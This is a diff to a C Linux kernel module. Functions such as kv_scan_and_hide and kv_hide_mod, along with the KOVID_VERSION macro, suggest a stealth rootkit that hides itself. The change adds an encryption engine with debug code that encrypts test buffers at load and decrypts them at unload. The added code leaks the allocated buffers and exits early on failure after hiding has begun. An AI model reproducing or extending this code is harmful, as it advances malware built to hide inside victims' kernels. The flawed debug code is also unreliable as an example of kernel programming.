@@ -25,7 +25,9 @@
 #include <linux/namei.h>
 #include <linux/ctype.h>
 #include <linux/parser.h>
+#include <linux/random.h>
 
+#include "crypto.h"
 #include "lkm.h"
 #include "fs.h"
 #include "version.h"
@@ -65,6 +67,10 @@ struct __lkmmod_t{ struct module *this_mod; };
 static unsigned int op_lock;
 static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(elfbits_spin);
+
+
+//XXX debug
+static struct kv_crypto_st *kvmgc0, *kvmgc1;
 
 /** gcc  - fuck 32 bits shit (for now!) */
 #ifndef __x86_64__
@@ -748,6 +754,7 @@ static int __init kv_init(void) {
     struct kernel_syscalls *kaddr = NULL;
 #endif
 
+
     /** show current version for when running in debug mode */
     prinfo("version %s\n", KOVID_VERSION);
 
@@ -808,6 +815,32 @@ cont:
 
     kv_scan_and_hide();
 
+    /** Init crypto engine */
+    kv_crypto_key_init();
+
+    /** debug */
+    kvmgc0 =crypto_init();
+    if (kvmgc0) {
+        size_t datalen = 64;
+        u8 *buf = kmalloc(datalen, GFP_KERNEL);
+        if (!buf)
+            return -ENOMEM;
+
+        memset(buf, 'A', datalen);
+        kv_encrypt(kvmgc0, buf, datalen);
+    }
+
+    kvmgc1 =crypto_init();
+    if (kvmgc1) {
+        size_t datalen = 64;
+        u8 *buf = kmalloc(datalen, GFP_KERNEL);
+        if (!buf)
+            return -ENOMEM;
+
+        /** go random this time */
+        get_random_bytes(buf, datalen);
+        kv_encrypt(kvmgc1, buf, datalen);
+    }
 
 #ifndef DEBUG_RING_BUFFER
     kv_hide_mod();
@@ -859,6 +892,14 @@ static void __exit kv_cleanup(void) {
     }
 
     fs_names_cleanup();
+
+    /** debug */
+    kv_decrypt(kvmgc0);
+    kv_decrypt(kvmgc1);
+
+    kv_crypto_mgc_deinit(kvmgc0);
+    kv_crypto_mgc_deinit(kvmgc1);
+    kv_crypto_deinit();
 
     prinfo("unloaded.\n");
 }
